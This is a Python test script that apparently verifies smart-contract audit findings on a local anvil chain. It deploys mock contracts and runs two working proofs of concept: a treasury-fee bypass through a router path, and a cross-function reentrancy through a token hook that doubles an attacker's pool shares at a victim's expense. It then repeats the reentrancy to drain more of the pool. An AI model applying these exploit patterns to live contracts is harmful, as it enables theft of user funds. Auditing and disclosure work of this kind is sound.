# -*- coding: utf-8 -*-
"""
verify_samples.py — Sherlock 备弹样例集真跑验证（无 forge 链路：solc + anvil + cast）
跑法: python verify_samples.py   （需 anvil 已在 8899 端口运行）
结构: [compile 复用 _combined.json] → [deploy] → [S1] 费用绕过 → [S2] 跨函数重入 → RESULT
"""
import json, re, subprocess, sys

RPC = "http://localhost:8899"
FOUNDRY = r"C:\Users\Administrator\.foundry\bin"
# anvil 默认第 0/1 账户私钥
PK0 = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
PK1 = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
ADDR0 = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"  # deployer / attacker-owner
ADDR1 = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"  # victim
ADDR2 = "0x3C44CdDdB6a900fa2b585dd299e03d12Fa4293BC"  # treasury

C = lambda *a: subprocess.run([FOUNDRY + r"\cast.exe", *a], capture_output=True, text=True,
                              encoding="utf-8", errors="replace").stdout

results = {}

def deploy(name, enc_args=""):
    """坑A/坑B: 全局选项前置; 构造参数 ABI 编码(无选择器)拼尾部."""
    out = C("send", "--rpc-url", RPC, "--private-key", PK0, "--json",
            "--create", BINS[name] + enc_args)
    j = json.loads(out)
    if j.get("status") != "0x1":
        raise RuntimeError("deploy %s failed: %s" % (name, out))
    return j["contractAddress"]

def send(to, sig, *args, pk=PK0):
    """交易 + 假绿防护(坑Q): 解析 status."""
    p = subprocess.run([FOUNDRY + r"\cast.exe", "send", "--rpc-url", RPC, "--private-key", pk,
                        "--json", to, sig, *[str(a) for a in args]],
                       capture_output=True, text=True, encoding="utf-8", errors="replace")
    out = p.stdout
    if not out.strip():
        raise RuntimeError("send empty (rc=%s, stderr=%s)" % (p.returncode, p.stderr[:300]))
    try:
        j = json.loads(out)
    except Exception:
        raise RuntimeError("send parse fail: %s | stderr: %s" % (out[:300], p.stderr[:300]))
    ok = j.get("status") == "0x1"
    return ok, out

def call(sig, *args, to=None):
    """坑C/坑M: 显式 --rpc-url + 过滤人类可读注解."""
    out = C("call", to, sig, *[str(a) for a in args], "--rpc-url", RPC)
    return [t for t in out.split() if not (t.startswith("[") and t.endswith("]"))]

def bal(token, who):
    return int(call("balanceOf(address)(uint256)", who, to=token)[0])

def pad_addr(a):
    return a[2:].lower().rjust(64, "0")

# ---------- [1] 编译产物 ----------
d = json.load(open("_combined.json"))
BINS = {k.split(":")[-1]: "0x" + v["bin"] for k, v in d["contracts"].items() if v["bin"]}

# ---------- [2] 部署 ----------
E = 10**18
usdc   = deploy("MockUSDC")
vault  = deploy("EntryFeeVault", pad_addr(usdc) + pad_addr(ADDR2))
hook   = deploy("HookToken")
pool   = deploy("StakingPool", pad_addr(hook))
attk   = deploy("Attacker", pad_addr(pool))
print("[deploy] usdc=%s vault=%s hook=%s pool=%s attacker=%s" % (usdc, vault, hook, pool, attk))

C("rpc", "anvil_setBalance", ADDR1, hex(10**20), "--rpc-url", RPC)

# ---------- [S1] 费用绕过：同结果 × 两条路径，一条不付费 ----------
# Path A (诚实): 存 1,000,000 USDC → 财政库收 1% = 10,000 USDC
usdc6 = 10**6
ok, _ = send(usdc, "mint(address,uint256)", ADDR1, 5_000_000 * usdc6, pk=PK0)
send(usdc, "approve(address,uint256)", vault, 2**256 - 1, pk=PK1)
okA, outA = send(vault, "depositWithFee(uint256)", 1_000_000 * usdc6, pk=PK1)
t_after_A = bal(usdc, ADDR2)
results["S1.A 诚实路径付费 10,000 USDC"] = okA and t_after_A == 10_000 * usdc6

# Path B (绕过): 同样存 1,000,000 USDC → 财政库 0 收入
bal_v_before = bal(usdc, vault)
tre_before = bal(usdc, ADDR2)
okB, outB = send(vault, "depositViaRouter(address,uint256)", ADDR0, 1_000_000 * usdc6, pk=PK1)
results["S1.B 同结果: 金库全额入账"] = okB and (bal(usdc, vault) - bal_v_before) == 1_000_000 * usdc6
results["S1.B 费用 100% 绕过: 财政库零收入"] = okB and (bal(usdc, ADDR2) - tre_before) == 0

# 重复利用 → 费用收入趋近 100% 流失
for _ in range(4):
    send(vault, "depositViaRouter(address,uint256)", ADDR0, 100_000 * usdc6, pk=PK1)
results["S1.B 可重复: N 次绕过后财政库仍为 0"] = bal(usdc, ADDR2) == 10_000 * usdc6

# ---------- [S2] 跨函数重入：withdraw 有守卫，deposit 无守卫 ----------
send(hook, "mint(address,uint256)", ADDR1, 100 * E, pk=PK0)        # victim 100
send(hook, "mint(address,uint256)", ADDR0, 100 * E, pk=PK0)        # attacker-owner 100
send(hook, "approve(address,uint256)", pool, 2**256 - 1, pk=PK1)
okD, _ = send(pool, "deposit(uint256)", 100 * E, pk=PK1)           # victim 存入 @ par
results["S2.前置: victim 以 par 价存入"] = okD and int(call("sharePrice()(uint256)", to=pool)[0]) == E

okS, _ = send(hook, "approve(address,uint256)", attk, 2**256 - 1, pk=PK0)  # owner→attacker 授权
okS, _ = send(attk, "stake(uint256)", 100 * E, pk=PK0)             # attacker 经合约存入
a_shares_par = int(call("sharesOf(address)(uint256)", attk, to=pool)[0])
results["S2.前置: attacker 合约 par 存入 100e18 shares"] = okS and a_shares_par == 100 * E

v_shares = int(call("sharesOf(address)(uint256)", ADDR1, to=pool)[0])
okW, outW = send(attk, "unstake(uint256)", 100 * E, pk=PK0)        # 触发 hook 重入
a_shares_after = int(call("sharesOf(address)(uint256)", attk, to=pool)[0])
results["S2.重入成功: attacker 100e18 → 200e18 shares(付100得200)"] = (
    okW and a_shares_after == 200 * E)

price = int(call("sharePrice()(uint256)", to=pool)[0])
a_value = a_shares_after * price // E
v_value = v_shares * price // E
results["S2.攻击者提值 > 存入(偷到钱)"] = a_value > 100 * E
results["S2.victim 受损(100 → <100)"] = v_value < 100 * E
print("    [S2] intra-pool price=%d, attacker value=%d, victim value=%d (E=1e18)" % (price, a_value, v_value))

# 复利: 反复薅至逼近吃干池子
for i in range(3):
    s = int(call("sharesOf(address)(uint256)", attk, to=pool)[0])
    send(attk, "unstake(uint256)", s // 2, pk=PK0)
a_shares_final = int(call("sharesOf(address)(uint256)", attk, to=pool)[0])
price = int(call("sharePrice()(uint256)", to=pool)[0])
a_value = a_shares_final * price // E
total = bal(hook, pool)
share_bps = a_value * 10_000 // total
results["S2.复利 3 轮后 attacker 池内价值 >150 tokens"] = a_value > 150 * E
print("    [S2] 3 轮后 attacker 价值=%d tokens, 占池 %d bps" % (a_value // E, share_bps))

# ---------- RESULT ----------
print("\n===== RESULT =====")
fails = 0
for k, v in results.items():
    print(("PASS  " if v else "FAIL  ") + k)
    fails += 0 if v else 1
print("TOTAL: %d/%d PASS" % (len(results) - fails, len(results)))
sys.exit(1 if fails else 0)
